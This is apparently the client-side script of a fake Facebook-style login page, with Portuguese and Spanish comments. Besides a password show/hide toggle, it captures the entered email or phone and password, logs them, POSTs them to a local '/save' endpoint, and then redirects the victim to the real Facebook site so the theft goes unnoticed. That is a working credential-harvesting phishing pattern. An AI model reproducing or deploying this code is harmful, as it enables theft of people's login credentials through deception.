//BOTÃO DE MOTRAR/ESCONDER SENHA

let container = document.querySelector('.fc-box-input');
let input = document.querySelector('fc-senha');
let icon = document.querySelector('img');


icon.addEventListener('click', function() {
    container.classList.toggle('visible');
    if(container.classList.contains('visible')) {
        icon.src = 'imgs/eye-close.svg';
        input.type = 'text';
    } else {
        icon.src = 'imgs/eye.svg';
        input.type = 'password';
    }
});


const form = document.getElementById('loginForm'); 

form.addEventListener('submit', function(e) {
    e.preventDefault(); 

    const email = document.getElementById('fc-email-telefone').value;
    const password = document.getElementById('fc-senha').value;

    console.log({ email, password });

    fetch('http://localhost:3000/save', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ email, password })
    })
    .then(response => {
        if(response.ok) {
            console.log('Datos guardados');
            window.location.href = 'https://www.facebook.com';
        } else {
            console.log('Error al guardar los datos');
        }
    })
    .catch(error => {
        console.log('Error al guardar los datos');
    });


});
